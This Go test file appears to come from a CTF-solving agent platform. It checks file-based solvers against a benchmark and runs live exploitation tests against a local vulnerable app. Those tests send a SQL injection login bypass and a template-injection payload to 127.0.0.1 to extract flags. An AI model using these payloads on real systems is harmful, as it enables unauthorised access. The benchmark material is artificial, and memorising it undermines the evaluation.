package ctfplatform

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// TestExecSolversAgainstBenchmark 用执行求解器对 execution_benchmark.json 的文件型题真实验证，
// 与 judge_exec.py 的 6/6 结果对齐（证明 Go 侧执行能力等价 Python 侧）。
// live_* 实时靶机题由 TestLiveExploitation 单独验证。
func TestExecSolversAgainstBenchmark(t *testing.T) {
	benchPath := filepath.Join("..", "..", "data", "ctf_benchmark", "execution_benchmark.json")
	raw, err := os.ReadFile(benchPath)
	if err != nil {
		t.Skipf("benchmark 缺失，跳过: %v", err)
	}
	var bench struct {
		Problems map[string]struct {
			Category    string            `json:"category"`
			Sub         string            `json:"sub"`
			Difficulty  string            `json:"difficulty"`
			Description string            `json:"description"`
			Attachments map[string]string `json:"attachments"`
			FlagSHA256  string            `json:"flag_sha256"`
			Skill       string            `json:"presolve_skill"`
		} `json:"problems"`
	}
	if err := json.Unmarshal(raw, &bench); err != nil {
		t.Fatalf("解析 benchmark 失败: %v", err)
	}

	execDir := filepath.Join("..", "..", "data", "ctf_benchmark", "execution")

	solverFor := map[string]func(context.Context, string, map[string]string) []string{
		"strings_flag":     tryExecStringsFlagScan,
		"git_history":      tryExecGitHistory,
		"web_source_audit": tryExecWebSourceAudit,
		"cookie_decode":    tryExecCookieDecode,
		"endian_swap":      tryExecEndianSwap,
		"pcap_http":        tryExecPcapHTTP,
		"morse_decode":     tryExecMorseDecode,
	}

	hits := 0
	total := 0
	for id, p := range bench.Problems {
		if strings.HasPrefix(p.Skill, "live_") {
			continue // 实时靶机题由 TestLiveExploitation 验证
		}
		total++
		fn, ok := solverFor[p.Skill]
		if !ok {
			t.Errorf("%s: 未找到对应 Go 求解器 %s", id, p.Skill)
			continue
		}
		atts := map[string]string{}
		for name, rel := range p.Attachments {
			full := filepath.Join(execDir, rel)
			if info, e := os.Stat(full); e == nil && info.IsDir() {
				out, e := exec.Command("git", "-C", full, "log", "-p", "--all", "--no-color").Output()
				if e != nil {
					t.Errorf("%s: git 执行失败 %v", id, e)
					continue
				}
				atts[name] = string(out)
			} else {
				b, e := os.ReadFile(full)
				if e != nil {
					t.Errorf("%s: 读取附件 %s 失败 %v", id, rel, e)
					continue
				}
				atts[name] = string(b)
			}
		}
		flags := fn(context.Background(), p.Description, atts)
		if len(flags) == 0 {
			t.Errorf("%s: 未解出 flag (skill=%s)", id, p.Skill)
			continue
		}
		sum := sha256.Sum256([]byte(flags[0]))
		if hex.EncodeToString(sum[:]) != p.FlagSHA256 {
			t.Errorf("%s: flag=%q sha 不匹配 (期望 %s)", id, flags[0], p.FlagSHA256[:12])
			continue
		}
		hits++
		t.Logf("✅ %s -> %s", id, flags[0])
	}
	if hits != total {
		t.Fatalf("执行基准集(文件型)命中 %d/%d，期望全命中", hits, total)
	}
}

// TestLiveExploitation 证明 Go 侧（net/http）能真正起靶机并发送利用 payload 提取 flag，
// 与 judge_exec.py 的 live_sqli/live_ssti 端到端一致（Agent 真实执行能力）。
func TestLiveExploitation(t *testing.T) {
	benchPath := filepath.Join("..", "..", "data", "ctf_benchmark", "execution_benchmark.json")
	raw, err := os.ReadFile(benchPath)
	if err != nil {
		t.Skip("benchmark 缺失，跳过")
	}
	var bench struct {
		Problems map[string]struct {
			FlagSHA256 string `json:"flag_sha256"`
		} `json:"problems"`
	}
	if err := json.Unmarshal(raw, &bench); err != nil {
		t.Fatal(err)
	}
	expectSQLI := bench.Problems["live_sqli"].FlagSHA256
	expectSSTI := bench.Problems["live_ssti"].FlagSHA256

	if _, err := os.Stat(filepath.Join("..", "..", "data", "ctf_benchmark", "live_target", "vuln_app.py")); err != nil {
		t.Skip("live_target 缺失，跳过")
	}
	cmd := exec.Command("python", filepath.Join("..", "..", "data", "ctf_benchmark", "live_target", "vuln_app.py"), "18099")
	if err := cmd.Start(); err != nil {
		t.Fatalf("启动靶机失败: %v", err)
	}
	defer cmd.Process.Kill()
	ready := false
	for i := 0; i < 50; i++ {
		if _, err := http.Get("http://127.0.0.1:18099/"); err == nil {
			ready = true
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	if !ready {
		t.Fatal("靶机未就绪")
	}

	// SQLi 绕过
	resp, err := http.PostForm("http://127.0.0.1:18099/login", url.Values{"user": {"admin' OR '1'='1"}, "pass": {"x"}})
	if err != nil {
		t.Fatalf("SQLi 请求失败: %v", err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	f := scanFlags(string(body))
	if len(f) == 0 {
		t.Fatalf("SQLi 未解出 flag, body=%s", string(body)[:160])
	}
	sum := sha256.Sum256([]byte(f[0]))
	if hex.EncodeToString(sum[:]) != expectSQLI {
		t.Fatalf("SQLi flag sha 不匹配: %s", f[0])
	}
	t.Logf("✅ live_sqli -> %s", f[0])

	// SSTI
	resp2, err := http.Get("http://127.0.0.1:18099/ssti?name=" + url.QueryEscape("{{flag()}}"))
	if err != nil {
		t.Fatalf("SSTI 请求失败: %v", err)
	}
	body2, _ := io.ReadAll(resp2.Body)
	resp2.Body.Close()
	f2 := scanFlags(string(body2))
	if len(f2) == 0 {
		t.Fatalf("SSTI 未解出 flag, body=%s", string(body2)[:160])
	}
	sum2 := sha256.Sum256([]byte(f2[0]))
	if hex.EncodeToString(sum2[:]) != expectSSTI {
		t.Fatalf("SSTI flag sha 不匹配: %s", f2[0])
	}
	t.Logf("✅ live_ssti -> %s", f2[0])
}
